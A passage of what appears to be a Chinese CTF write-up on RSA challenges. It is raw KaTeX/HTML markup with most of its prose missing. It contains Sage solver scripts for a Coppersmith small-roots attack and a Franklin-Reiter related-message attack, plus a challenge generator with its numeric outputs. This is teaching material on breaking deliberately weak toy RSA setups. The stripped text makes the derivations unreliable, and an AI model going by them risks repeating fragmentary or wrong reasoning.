class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p><code>e</code><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>c</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msup><mo></mo><msup><mi>m</mi><mrow><mi>e</mi><mo></mo><mi>n</mi></mrow></msup><mo></mo><mi>m</mi><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">c&#x27;\equiv m^{e*n}\equiv m\ mod\ q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><img src="https://picx.zhimg.com/80/v2-a4f09065668c095334e1bdd1a7478fab_1440w.png" alt="" /></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">118542873900747265901972229877883243863455720266210015956664954705111625457638899855027122945522479781037404808597170399339837193705757680088860677997958907356598337673929983523887709805385841477614948436454673040596579313465066950050748901502261100925866106567136278276272183814389727065752049737673528788851</span></span><br><span class="line">c = <span class="number">85091710660465995062917932706421029612933738881922031822674968124253137988309351810508978584348197911485561426918031817399685522559286375310408913518074664331882588344176796591922444160725511070449908851983275493777666568865120499654769828318792734657142197271358769027319683651960777955741591424859221331570</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = <span class="built_in">pow</span>(c, n, n) - x</span><br><span class="line">f = f.monic()</span><br><span class="line">res = f.small_roots(beta=<span class="number">0.67</span>, epsilon=<span class="number">0.04</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res[<span class="number">0</span>])).decode())</span><br></pre></td></tr></table></figure><h2 id=""><a class="markdownIt-Anchor" href="#"></a>  </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">240</span></span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">127</span></span><br><span class="line">delta = getPrime(<span class="number">1024</span>)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m + delta * randint(<span class="number">1</span>, <span class="number">16</span>), e, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m + delta * randint(<span class="number">1</span>, <span class="number">16</span>), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;delta =&#x27;</span>, delta)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>, c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>, c2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 79724747744041714288953392952463874801997705081106902943284648733918149185753839937134265686183985428507199115581472568110843698105733584732275660165830029909359483267387801214496783177450040180595781619052234234214466384716761078975184418283511523324752507723140024391761761919034003871792556646981516016829</span></span><br><span class="line"><span class="string">delta = 126231068620420223973893815509531523980528675989214589653267161043503977208634759494599578611297423840582424158720324586085466134446749572141985881213834874797105681653543775703457635235713661837619943424874322621237629070789752447854720667927421977431676296802472297153819769740875671325555175485801487562317</span></span><br><span class="line"><span class="string">c1 = 36578233020971843140854855402047493686821205871189638550273647983442002301763881467104013416020830811359646176983834496945892080167342879776467612198963515145695205542184908041221340742020262320462349152920227384763155486786470112042989101020262194775511567104383189663255042081708258269604855798589456059252</span></span><br><span class="line"><span class="string">c2 = 217496152646372905195410265855757862997908815896427895285321483108430164363119052551898699474219390009044650355199849989937145012074237320274174148963137082335030402537136022883092093136277846069764849794019465924895060791502105277845493988301747611257009487302383938540250170857241135318332565447081257370</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n, e, b, c1, c2</span>):</span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[]</span><br><span class="line">    f1 = X ^ e - c1</span><br><span class="line">    f2 = (X + b) ^ e - c2</span><br><span class="line">    <span class="comment"># coefficients()0</span></span><br><span class="line">    m_ = GCD(f1, f2).coefficients()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> Integer(n - m_)  <span class="comment"># tmp -m % n,</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()<span class="comment"># 1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> GCD(b, a % b)</span><br><span class="line">e = <span class="number">127</span></span><br><span class="line">n = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">delta = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    M = franklinReiter(n, e, i*delta, c1, c2)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        flag=long_to_bytes((M-j*delta+n)%n)</span><br><span class="line">        <span class="comment">#  M-j*delta </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;cnss&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code>coppersmith</code><a href="https://jayxv.github.io/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/">https://jayxv.github.io/2020/08/13/coppersmith/</a><code>Van1sh</code>Orzz</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><msub><mi>r</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mi>e</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c1=(m+r_{1})^{e}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo>=</mo><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><msub><mi>r</mi><mn>2</mn></msub><msup><mo stretchy="false">)</mo><mi>e</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c2=(m+r_{2})^{e}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>1</mn></msub><mo>=</mo><mi>m</mi><mo>+</mo><msub><mi>r</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">M_{1}=m+r_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mo>+</mo><msub><mi>r</mi><mn>2</mn></msub><mo>=</mo><msub><mi>M</mi><mn>1</mn></msub><mo>+</mo><mi>r</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M_{2}=m+r_{2}=M_{1}+r=f(M_{1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>X</mi><mi>e</mi></msup><mo></mo><mi>c</mi><mn>1</mn><mo></mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X^{e}-c1\equiv 0(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>X</mi><msup><mo stretchy="false">)</mo><mi>e</mi></msup><mo></mo><mi>c</mi><mn>2</mn><mo></mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(X)^{e}-c2\equiv 0(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><msub><mi>M</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">M_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext></mrow><annotation encoding="application/x-tex"></annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>P</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mtext></mtext><msub><mi>M</mi><mn>1</mn></msub><mtext></mtext><mi>P</mi><mo stretchy="false">(</mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn><mtext></mtext><mi>X</mi><mtext></mtext><msub><mi>M</mi><mn>1</mn></msub><mtext></mtext><mi>P</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mtext></mtext></mrow><annotation encoding="application/x-tex">P(X)M_{1}P(M_{1})=0XM_{1}P(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>Q</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mtext></mtext><mi>P</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>X</mi><mo></mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mi>Q</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q(X)P(X)=(X-M_{1})Q(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord 